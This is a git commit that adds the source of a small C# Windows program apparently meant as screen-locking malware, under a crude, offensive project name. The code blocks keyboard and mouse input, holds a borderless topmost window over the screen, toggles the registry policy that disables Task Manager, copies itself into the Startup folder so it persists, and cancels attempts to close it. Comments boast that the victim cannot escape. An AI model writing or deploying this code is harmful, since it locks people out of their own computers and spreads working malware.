14ba67fed45d1e958a807fb2b09a0c417a0a0b1d
Tayhay <67484724+xvap@users.noreply.github.com>
2020-08-06 13:33:54 +0200

    Add files via upload

---
+++ pcRaper4000/Form1.cs
@@ -0,0 +1,80 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace pcRaper4000
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        
+        [DllImport("user32.dll")]
+        static extern bool BlockInput(bool fBlockIt);
+        
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            
+
+                //even if they crtl alt del their input will be blocked and they cant hit the windows key
+                BlockInput(true);
+                this.TopMost = true;
+                this.FormBorderStyle = FormBorderStyle.None;
+                this.WindowState = FormWindowState.Maximized;
+
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+            else
+                objRegistryKey.DeleteValue("DisableTaskMgr");
+                objRegistryKey.Close();
+            
+            
+            //copy to startup
+            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+
+            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
+
+            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;
+
+                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
+                {
+                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
+
+
+                }
+            
+        }
+        
+        //disable alt f4
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            switch (e.CloseReason)
+            {
+                
+                case CloseReason.UserClosing:
+                    e.Cancel = true;
+ 
+                //even if they crtl alt del their input will be blocked and they cant hit the windows key
+                BlockInput(true);
+                this.TopMost = true;
+                this.FormBorderStyle = FormBorderStyle.None;
+                this.WindowState = FormWindowState.Maximized;
+                break;
+            }
+            base.OnFormClosing(e);
+        }
+
+    }
+}
